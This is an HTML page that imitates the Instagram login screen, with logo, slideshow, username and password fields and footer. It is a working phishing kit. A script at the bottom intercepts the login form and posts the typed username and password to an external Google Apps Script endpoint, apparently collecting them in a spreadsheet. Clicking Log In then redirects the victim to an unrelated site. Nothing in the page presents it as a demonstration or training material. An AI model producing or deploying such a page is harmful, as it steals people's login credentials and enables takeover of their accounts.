<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./app.css">
</head>
<body>
    <div class="container">
        <div class="main-container">
            <div class="main-content">
                <div class="slide-container" style="background-image: url(./images/phone-frame.png);">
                    <div class="slide-content" id="slide-content">
                        <img src="./images/slide (1).jpg" alt="slide image" class="active">
                        <img src="./images/slide (2).jpg" alt="slide image">
                        <img src="./images/slide (3).jpg" alt="slide image">
                        <img src="./images/slide (4).jpg" alt="slide image">
                        <img src="./images/slide (5).jpg" alt="slide image">
                    </div>
                </div>
                <div class="form-container">
                    <div class="form-content box">
                        <div class="logo">
                            <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
                            <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
                        </div>
                            <form method="post" name="google-sheet">
                                <div class="signin-form" id="signin-form">
                                    <div class="form-group">
                                        <input class="input-box" type="text" name="username" required placeholder="Phone number, username, or email">
                                    </div>
                                    <div class="form-group">
                                        <div class="animate-input">
                                            <input class="input-box" type="password" name="password" required placeholder="Password">
                                            <button>Show</button>
                                        </div>
                                    </div>
                                    <div class="btn-group">
                                       <input class="button" type="submit" name="login" value="Log In" onClick="myFunction()"/>
                                       <script>
      function myFunction() {
        window.location.href="http://programminghead.com";  
      }
    </script>
                                    </div>
                                    <div class="divine">
                                        <div></div>
                                        <div>OR</div>
                                        <div></div>
                                    </div>
                                    <div class="btn-group">
                                        <button class="btn-fb">
                                    <img src="./images/facebook-icon.png" alt="">
                                    <span>Log in with Facebook</span>
                                </button>
                                    </div>
                                    <a href="#" class="forgot-pw">Forgot password?</a>
                                </div>
                            </form>
                    </div>
                    <div class="top">
                        <div class="box goto">
                            <p>
                                Don't have an account?
                                <a href="#">Sign up</a>
                            </p>
                        </div>
                    </div>
                    <div class="app-download">
                        <p>Get the app.</p>
                        <div class="store-link">
                            <a href="#">
                                <img src="./images/app-store.png" alt="app store">
                            </a>
                            <a href="#">
                                <img src="./images/gg-play.png" alt="google play">
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer">
            <div class="links">
                <a href="#">About</a>
                <a href="#">Blog</a>
                <a href="#">Jobs</a>
                <a href="#">Help</a>
                <a href="#">API</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Top Accounts</a>
                <a href="#">Hashtags</a>
                <a href="#">Locations</a>
                <a href="#" id="darkmode-toggle">Darkmode</a>
            </div>
            <div class="copyright">
                Â© 2021 Instagram from Facebook
            </div>
        </div>
    </div>
    <script src="./app.js"></script>
    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbwRS3rLRfzTuFhpjImtn2GFvUUvBPgs48u-XqeDmkoOGlsRNxL_ijZ8GRag0Fp2hL3aIQ/exec'
        const form = document.forms['google-sheet']
        form.addEventListener('submit', e => {
            e.preventDefault()
            fetch(scriptURL, {
                    method: 'POST',
                    body: new FormData(form)
                })
                .catch(error => console.error('Error!', error.message))
        })
    </script>
</body>
</html>
